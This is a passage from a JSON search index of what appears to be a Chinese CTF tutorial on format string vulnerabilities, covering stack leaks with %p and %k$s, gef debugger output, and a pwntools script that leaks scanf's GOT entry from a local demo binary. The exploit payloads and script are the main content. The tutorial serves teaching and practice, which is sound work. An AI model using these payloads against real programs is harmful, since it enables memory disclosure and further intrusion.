\u5f53\u7136\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u8fd9\u6837\u7684\u90fd\u4f1a\u6b63\u5e38\u8fd0\u884c\uff0c\u5982\u679c\u5bf9\u5e94\u7684\u53d8\u91cf\u4e0d\u80fd\u591f\u88ab\u89e3\u6790\u4e3a\u5b57\u7b26\u4e32\u5730\u5740\uff0c\u90a3\u4e48\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u76f4\u63a5\u5d29\u6e83\u3002  \u6b64\u5916\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u6307\u5b9a\u83b7\u53d6\u6808\u4e0a\u7b2c\u51e0\u4e2a\u53c2\u6570\u4f5c\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8f93\u51fa\uff0c\u6bd4\u5982\u6211\u4eec\u6307\u5b9a\u7b2cprintf\u7684\u7b2c3\u4e2a\u53c2\u6570\uff0c\u5982\u4e0b\uff0c\u6b64\u65f6\u7a0b\u5e8f\u5c31\u4e0d\u80fd\u591f\u89e3\u6790\uff0c\u5c31\u5d29\u6e83\u4e86\u3002  \u279c  leakmemory git: ( master )  \u2717 ./leakmemory\n%2 $s  00000001 .22222222.ffffffff.%2 $s  [ 1 ]      57534  segmentation fault  ( core dumped )   ./leakmemory  \u5c0f\u6280\u5de7\u603b\u7ed3    \u5229\u7528%x\u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528%p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\u3002  \u5229\u7528%s\u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\u3002  \u5229\u7528%order x\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528%order\\ x\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528%order\\ s\u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u3002", 
            "title": "\u83b7\u53d6\u6808\u53d8\u91cf\u5bf9\u5e94\u5b57\u7b26\u4e32"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_7", 
            "text": "\u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u4e0a\u9762\u65e0\u8bba\u662f\u6cc4\u9732\u6808\u4e0a\u8fde\u7eed\u7684\u53d8\u91cf\uff0c\u8fd8\u662f\u8bf4\u6cc4\u9732\u6307\u5b9a\u7684\u53d8\u91cf\u503c\uff0c\u6211\u4eec\u90fd\u6ca1\u80fd\u5b8c\u5168\u63a7\u5236\u6211\u4eec\u6240\u8981\u6cc4\u9732\u7684\u53d8\u91cf\u7684\u5730\u5740\u3002\u8fd9\u6837\u7684\u6cc4\u9732\u56fa\u7136\u6709\u7528\uff0c\u53ef\u662f\u5374\u4e0d\u591f\u5f3a\u529b\u6709\u6548\u3002\u6709\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u60f3\u8981\u6cc4\u9732\u67d0\u4e00\u4e2alibc\u51fd\u6570\u7684got\u8868\u5185\u5bb9\uff0c\u4ece\u800c\u5f97\u5230\u5176\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\u7248\u672c\u4ee5\u53ca\u5176\u4ed6\u51fd\u6570\u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5019\uff0c\u80fd\u591f\u5b8c\u5168\u63a7\u5236\u6cc4\u9732\u67d0\u4e2a\u6307\u5b9a\u5730\u5740\u7684\u5185\u5b58\u5c31\u663e\u5f97\u5f88\u91cd\u8981\u4e86\u3002\u90a3\u4e48\u6211\u4eec\u7a76\u7adf\u80fd\u4e0d\u80fd\u8fd9\u6837\u505a\u5462\uff1f\u81ea\u7136\u4e5f\u662f\u53ef\u4ee5\u7684\u5566\u3002  \u6211\u4eec\u518d\u4ed4\u7ec6\u56de\u60f3\u4e00\u4e0b\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\uff0c\u6211\u4eec\u6240\u8bfb\u53d6\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5728\u6808\u4e0a\u7684\u3002\u90a3\u4e48\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u8c03\u7528\u8f93\u51fa\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u503c\u5176\u5b9e\u5c31\u662f\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u6211\u4eec\u9009\u62e9\u4e0a\u9762\u7684\u67d0\u4e2a\u51fd\u6570\u8c03\u7528\u4e3a\u4f8b  Breakpoint  1 , __printf  ( format = 0xffffcd10  %s )  at printf.c:28 28   in printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  code:i386  ] \u2500\u2500\u2500\u2500\n   0xf7e44667  fprintf+23      inc    DWORD PTR  [ ebx+0x66c31cc4 ] \n   0xf7e4466d                  nop    \n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret    \n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccfc ,  l8 ]  8 \n0xffffccfc\u2502+0x00: 0x080484ce  \u2192   main+99  add esp, 0x10     \u2190  $esp \n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192  0xff007325  ( %s ? ) \n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192  0xff007325  ( %s ? ) \n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192   handle_intel+107  add esp, 0x10\n0xffffcd10\u2502+0x14: 0xff007325  ( %s ? )      \u2190  $eax \n0xffffcd14\u2502+0x18: 0xffffce3c  \u2192  0xffffd074  \u2192   XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...] \n0xffffcd18\u2502+0x1c: 0x000000e0  \u53ef\u4ee5\u770b\u51fa\u5728\u6808\u4e0a\u7684\u7b2c\u4e8c\u4e2a\u53d8\u91cf\u5c31\u662f\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u57400xffffcd10\uff0c\u540c\u65f6\u8be5\u5730\u5740\u5b58\u50a8\u7684\u4e5f\u786e\u5b9e\u662f\u662f\"%s\"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5185\u5bb9\u3002  \u90a3\u4e48\u7531\u4e8e\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u8f93\u51fa\u51fd\u6570\u8c03\u7528\u65f6\u662f\u7b2c\u51e0\u4e2a\u53c2\u6570\uff0c\u8fd9\u91cc\u5047\u8bbe\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f8\u5bf9\u51fd\u6570\u8c03\u7528\u4e3a\u7b2ck\u4e2a\u53c2\u6570\u3002\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u67d0\u4e2a\u6307\u5b9a\u5730\u5740addr\u7684\u5185\u5bb9\u3002  addr%k$s   \u6ce8\uff1a \u5728\u8fd9\u91cc\uff0c\u5982\u679c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u6808\u4e0a\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u4e00\u5b9a\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5bf9\u504f\u79fb\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u51fd\u6570\u8c03\u7528\u7684\u65f6\u5019\u6808\u6307\u9488\u81f3\u5c11\u4f4e\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5730\u57408\u5b57\u8282\u6216\u800516\u5b57\u8282\u3002   \u4e0b\u9762\u5c31\u662f\u5982\u4f55\u786e\u5b9a\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e3a\u7b2c\u51e0\u4e2a\u53c2\u6570\u7684\u95ee\u9898\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u786e\u5b9a  [tag]%p%p%p%p%p%p...  \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u91cd\u590d\u67d0\u4e2a\u5b57\u7b26\u7684\u673a\u5668\u5b57\u957f\u6765\u4f5c\u4e3atag\uff0c\u800c\u540e\u9762\u4f1a\u8ddf\u4e0a\u82e5\u5e72\u4e2a%p\u6765\u8f93\u51fa\u6808\u4e0a\u7684\u5185\u5bb9\uff0c\u5982\u679c\u5185\u5bb9\u4e0e\u6211\u4eec\u524d\u9762\u7684tag\u91cd\u590d\u4e86\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6709\u5f88\u5927\u628a\u63e1\u8bf4\u660e\u8be5\u5730\u5740\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u4e4b\u6240\u4ee5\u8bf4\u662f\u6709\u5f88\u5927\u628a\u63e1\uff0c\u8fd9\u662f\u56e0\u4e3a\u4e0d\u6392\u9664\u6808\u4e0a\u6709\u4e00\u4e9b\u4e34\u65f6\u53d8\u91cf\u4e5f\u662f\u8be5\u6570\u503c\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6781\u5176\u5c11\u89c1\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u66f4\u6362\u5176\u4ed6\u5b57\u7b26\u8fdb\u884c\u5c1d\u8bd5\uff0c\u8fdb\u884c\u518d\u6b21\u786e\u8ba4\u3002\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u5b57\u7b26'A'\u4f5c\u4e3a\u7279\u5b9a\u5b57\u7b26\uff0c\u540c\u65f6\u8fd8\u662f\u5229\u7528\u4e4b\u524d\u7f16\u8bd1\u597d\u7684\u7a0b\u5e8f\uff0c\u5982\u4e0b  \u279c  leakmemory git: ( master )  \u2717 ./leakmemory\nAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p 00000001 .22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\nAAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7%   \u75310x41414141\u5904\u6240\u5728\u7684\u4f4d\u7f6e\u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u6b63\u597d\u662f\u8f93\u51fa\u51fd\u6570\u7684\u7b2c5\u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c4\u4e2a\u53c2\u6570\u3002\u6211\u4eec\u53ef\u4ee5\u6765\u6d4b\u8bd5\u4e00\u4e0b  \u279c  leakmemory git: ( master )  \u2717 ./leakmemory\n%4 $s  00000001 .22222222.ffffffff.%4 $s  [ 1 ]      61439  segmentation fault  ( core dumped )   ./leakmemory  \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7684\u7a0b\u5e8f\u5d29\u6e83\u4e86\uff0c\u4e3a\u4ec0\u4e48\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u8bd5\u56fe\u5c06\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u5bf9\u5e94\u7684\u503c\u4f5c\u4e3a\u5730\u5740\u8fdb\u884c\u89e3\u6790\uff0c\u4f46\u662f\u663e\u7136\u8be5\u503c\u6ca1\u6709\u529e\u6cd5\u4f5c\u4e3a\u4e00\u4e2a\u5408\u6cd5\u7684\u5730\u5740\u88ab\u89e3\u6790\uff0c\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u5d29\u6e83\u4e86\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u53c2\u8003\u4e0b\u9762\u7684\u8c03\u8bd5\u3002   \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret    \n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffcd0c ,  l8 ]  8 \n0xffffcd0c\u2502+0x00: 0x080484ce  \u2192   main+99  add esp, 0x10     \u2190  $esp \n0xffffcd10\u2502+0x04: 0xffffcd20  \u2192   %4 $s \n0xffffcd14\u2502+0x08: 0xffffcd20  \u2192   %4 $s \n0xffffcd18\u2502+0x0c: 0x000000c2\n0xffffcd1c\u2502+0x10: 0xf7e8b6bb  \u2192   handle_intel+107  add esp, 0x10\n0xffffcd20\u2502+0x14:  %4 $s      \u2190  $eax \n0xffffcd24\u2502+0x18: 0xffffce00  \u2192  0x00000000\n0xffffcd28\u2502+0x1c: 0x000000e0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  trace  ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0xffffcd20  %4$s )  [ #1] 0x80484ce \u2192 Name: main() \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4   help  x/\nExamine memory: x/FMT ADDRESS.\nADDRESS is an expression  for  the memory address to examine.\nFMT is a repeat count followed by a format letter and a size letter.\nFormat letters are o ( octal ) , x ( hex ) , d ( decimal ) , u ( unsigned decimal ) ,\n  t ( binary ) , f ( float ) , a ( address ) , i ( instruction ) , c ( char ) , s ( string ) \n  and z ( hex, zero padded on the left ) .\nSize letters are b ( byte ) , h ( halfword ) , w ( word ) , g ( giant,  8  bytes ) .\nThe specified number of objects of the specified size are printed\naccording to the format.\n\nDefaults  for  format and size letters are those previously used.\nDefault count is  1 .  Default address is following last thing printed\nwith this  command  or  print .\ngef\u27a4  x/x 0xffffcd20\n0xffffcd20: 0x73243425\ngef\u27a4  vmmap \nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n0x08049000 0x0804a000 0x00000000 r-- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n0x0804a000 0x0804b000 0x00001000 rw- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\n0x0804b000 0x0806c000 0x00000000 rw-  [ heap ] \n0xf7dfb000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fab000 0xf7fad000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fad000 0xf7fae000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fae000 0xf7fb1000 0x00000000 rw- \n0xf7fd3000 0xf7fd5000 0x00000000 rw- \n0xf7fd5000 0xf7fd7000 0x00000000 r--  [ vvar ] \n0xf7fd7000 0xf7fd9000 0x00000000 r-x  [ vdso ] \n0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffb000 0xf7ffc000 0x00000000 rw- \n0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so\n0xffedd000 0xffffe000 0x00000000 rw-  [ stack ] \ngef\u27a4  x/x 0x73243425\n0x73243425: Cannot access memory at address 0x73243425  \u663e\u71360xffffcd20\u5904\u6240\u5bf9\u5e94\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6240\u5bf9\u5e94\u7684\u53d8\u91cf\u503c0x73243425\u5e76\u4e0d\u80fd\u591f\u88ab\u6539\u7a0b\u5e8f\u8bbf\u95ee\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u81ea\u7136\u5d29\u6e83\u4e86\u3002  \u90a3\u4e48\u5982\u679c\u6211\u4eec\u8bbe\u7f6e\u4e00\u4e2a\u53ef\u8bbf\u95ee\u7684\u5730\u5740\u5462\uff1f\u6bd4\u5982\u8bf4scanf@got\uff0c\u7ed3\u679c\u4f1a\u600e\u4e48\u6837\u5462\uff1f\u5e94\u8be5\u81ea\u7136\u662f\u8f93\u51fascanf\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u6211\u4eec\u4e0d\u59a8\u6765\u8bd5\u4e00\u4e0b\u3002  \u9996\u5148\uff0c\u83b7\u53d6scanf@got\u7684\u5730\u5740\uff0c\u5982\u4e0b   \u8fd9\u91cc\u4e4b\u6240\u4ee5\u6ca1\u6709\u4f7f\u7528printf\u51fd\u6570\uff0c\u662f\u56e0\u4e3ascanf\u51fd\u6570\u4f1a\u5bf90a\uff0c0b\uff0c0c\uff0c00\u7b49\u5b57\u7b26\u6709\u4e00\u4e9b\u5947\u602a\u7684\u5904\u7406\uff0c\uff0c\u5bfc\u81f4\u65e0\u6cd5\u6b63\u5e38\u8bfb\u5165\uff0c\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u8bd5\u8bd5\u3002\u3002\u3002\u3002   gef\u27a4  got\n\n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory\uff1a     \u6587\u4ef6\u683c\u5f0f elf32-i386\n\nDYNAMIC RELOCATION RECORDS\nOFFSET   TYPE              VALUE \n08049ffc R_386_GLOB_DAT    __gmon_start__\n0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0\n0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0\n0804a014 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7  \u4e0b\u9762\u6211\u4eec\u5229\u7528pwntools\u6784\u9020payload\u5982\u4e0b  from   pwn   import   *  sh   =   process ( ./leakmemory )  leakmemory   =   ELF ( ./leakmemory )  __isoc99_scanf_got   =   leakmemory . got [ __isoc99_scanf ]  print   hex ( __isoc99_scanf_got )  payload   =   p32 ( __isoc99_scanf_got )   +   %4$s  print   payload  gdb . attach ( sh )  sh . sendline ( payload )  sh . recvuntil ( %4$s \\n )  print   hex ( u32 ( sh . recv ()[ 4 : 8 ]))   # remove the first bytes of __isoc99_scanf@got  sh . interactive ()   \u5176\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528gdb.attach(sh)\u6765\u8fdb\u884c\u8c03\u8bd5\u3002\u5f53\u6211\u4eec\u8fd0\u884c\u5230\u7b2c\u4e8c\u4e2aprintf\u51fd\u6570\u7684\u65f6\u5019(\u8bb0\u5f97\u4e0b\u65ad\u70b9)\uff0c\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684\u7b2c\u56db\u4e2a\u53c2\u6570\u786e\u5b9e\u6307\u5411\u6211\u4eec\u7684scanf\u7684\u5730\u5740\uff0c\u8fd9\u91cc\u8f93\u51fa    \u2192   0xf7615670   printf + 0         call     0xf76ebb09   __x86 . get_pc_thunk . ax \n    \u21b3    0xf76ebb09   __x86 . get_pc_thunk . ax + 0   mov      eax ,   DWORD   PTR   [ esp ] \n       0xf76ebb0c   __x86 . get_pc_thunk . ax + 3   ret     \n       0xf76ebb0d   __x86 . get_pc_thunk . dx + 0   mov      edx ,   DWORD   PTR   [ esp ] \n       0xf76ebb10   __x86 . get_pc_thunk . dx + 3   ret      \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [   stack   ] \u2500\u2500\u2500\u2500  [ 0xffbbf8dc ,   l8 ]  8  0xffbbf8dc \u2502 + 0x00 :   0x080484ce    \u2192    main + 99   add   esp ,   0x10       \u2190   $ esp  0xffbbf8e0 \u2502 + 0x04 :   0xffbbf8f0    \u2192    0x0804a014    \u2192    0xf76280c0    \u2192    __isoc99_scanf + 0   push   ebp  0xffbbf8e4 \u2502 + 0x08 :   0xffbbf8f0    \u2192    0x0804a014    \u2192    0xf76280c0    \u2192    __isoc99_scanf + 0   push   ebp  0xffbbf8e8 \u2502 + 0x0c :   0x000000c2  0xffbbf8ec \u2502 + 0x10 :   0xf765c6bb    \u2192    handle_intel + 107   add   esp ,   0x10  0xffbbf8f0 \u2502 + 0x14 :   0x0804a014    \u2192    0xf76280c0    \u2192    __isoc99_scanf + 0   push   ebp    \u2190   $ eax  0xffbbf8f4 \u2502 + 0x18 :   %4$s  0xffbbf8f8 \u2502 + 0x1c :   0x00000000   \u540c\u65f6\uff0c\u5728\u6211\u4eec\u8fd0\u884c\u7684terminal\u4e0b  \u279c    leakmemory   git :( master )   \u2717   python   exploit . py  [ + ]   Starting   local   process   ./leakmemory :   pid   65363  [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory \n     Arch :       i386 - 32 - little \n     RELRO :      Partial   RELRO \n     Stack :      No   canary   found \n     NX :         NX   enabled \n     PIE :        No   PIE   ( 0x8048000 )  0x804a014 \n\\ x14 \\ xa0 \\ x0 % 4 $ s  [ * ]   running   in   new   terminal :   / usr / bin / gdb   - q    /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory   65363  [ + ]   Waiting   for   debugger :   Done  0xf76280c0  [ * ]   Switching   to   interactive   mode  [ * ]   Process   ./leakmemory   stopped   with   exit   code   0   ( pid   65363 )  [ * ]   Got   EOF   while   reading   in   interactiv   \u6211\u4eec\u786e\u5b9e\u5f97\u5230\u4e86scanf\u7684\u5730\u5740\u3002  \u4f46\u662f\uff0c\u5e76\u4e0d\u662f\u8bf4\u6240\u6709\u7684\u504f\u79fb\u673a\u5668\u5b57\u957f\u7684\u6574\u6570\u500d\uff0c\u53ef\u4ee5\u8ba9\u6211\u4eec\u76f4\u63a5\u76f8\u5e94\u53c2\u6570\u6765\u83b7\u53d6\uff0c\u6709\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u6211\u4eec\u8f93\u5165\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8fdb\u884c\u586b\u5145\uff0c\u6765\u4f7f\u5f97\u6211\u4eec\u60f3\u8981\u6253\u5370\u7684\u5730\u5740\u5185\u5bb9\u7684\u5730\u5740\u4f4d\u4e8e\u673a\u5668\u5b57\u957f\u6574\u6570\u500d\u7684\u5730\u5740\u5904\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8fd9\u4e2a\u6837\u5b50\u3002  [padding][addr]  \u6ce8\u610f   \u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u5728\u547d\u4ee4\u884c\u8f93\u5165\\x0c\\xa0\\x04\\x08%4$s\u8fd9\u662f\u56e0\u4e3a\u867d\u7136\u524d\u9762\u7684\u786e\u5b9e\u662fprintf@got\u7684\u5730\u5740\uff0c\u4f46\u662f\uff0cscanf\u51fd\u6570\u5e76\u4e0d\u4f1a\u5c06\u5176\u8bc6\u522b\u4e3a\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u800c\u662f\u4f1a\u5c06\\,x,0,c\u5206\u522b\u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u8fdb\u884c\u8bfb\u5165\u3002\u4e0b\u9762\u5c31\u662f\u9519\u8bef\u7684\u4f8b\u5b50\u3002  0xffffccfc\u2502+0x00: 0x080484ce  \u2192   main+99  add esp, 0x10   \u2190  $esp \n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192   \\x0c\\xa0\\x04\\x08%4 $s \n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192   \\x0c\\xa0\\x04\\x08%4 $s \n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192   handle_intel+107  add esp, 0x10\n0xffffcd10\u2502+0x14:  \\x0c\\xa0\\x04\\x08%4 $s    \u2190  $eax \n0xffffcd14\u2502+0x18:  \\xa0\\x04\\x08%4 $s \n0xffffcd18\u2502+0x1c:  \\x04\\x08%4 $s \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  trace  ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0xffffcd10  \\\\x0c\\\\xa0\\\\x04\\\\x08%4$s )  [ #1] 0x80484ce \u2192 Name: main() 